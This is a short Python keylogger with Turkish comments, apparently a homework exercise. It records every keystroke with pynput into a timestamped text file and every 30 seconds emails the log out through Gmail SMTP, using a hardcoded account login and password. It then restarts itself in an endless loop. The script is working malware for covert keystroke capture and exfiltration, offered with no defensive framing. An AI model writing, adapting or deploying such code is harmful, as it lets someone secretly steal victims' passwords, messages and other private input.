import datetime, time
from pynput.keyboard import Listener


def key_listener():
    # log dosyası tarih bilgisi için değişken tanımlandı
    d = datetime.datetime.now().strftime('%y-%m-%d_%H-%M-%S')

    # bilgilerimizi tutacak olan txt formatındaki dosya oluşturuldu.
    file_name = 'keylogger_{}.txt'.format(d)
    f = open(file_name, 'w')

    # ilk zaman
    time0 = time.time()

    # mail gönderme fonksiynu tanımlandı.
    def send_email():

        import smtplib

        with open(file_name, 'r+') as f:
            data = f.read()

        try:

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()

            # E-mail, şifre ve alıcıyı "login" ve "sendmail" fonksiyonlarında tanımladım.
            server.login('odevbut@gmail.com', 'odevbutunleme')
            server.sendmail('odevbut@gmail.com', 'odevbutunleme', data)

            print('E-mail başarıyla gönderildi!')
            server.quit()
            key_listener()

        except:

            print('E-Mail gönderilemedi :(')
            server.quit()
            key_listener()

    # tuş kayıt fonksiyonu oluşturuldu.
    def key_recorder(key):
        key = str(key)
        if key == 'Key.ctrl':
            f.write('')
        elif key == 'Key.enter':
            f.write('\n')
        elif key == 'Key.space':
            f.write(' ')
        elif key == 'Key.backspace':
            f.write('%BORRAR%')
        elif key == 'Key.shift_r':
            f.write('')
        elif key == '<65027>':
            f.write('')
        else:
            f.write(key.replace("'", ""))

        # Her 30 saniyede dosya kapanıyor ve send_email fonksiyonu çağırılıyor.
        if time.time() - time0 > 30:
            f.close()
            send_email()

    with Listener(on_press=key_recorder) as listener:
        listener.join()


# döngü başlatıldı.
while True:
    key_listener()
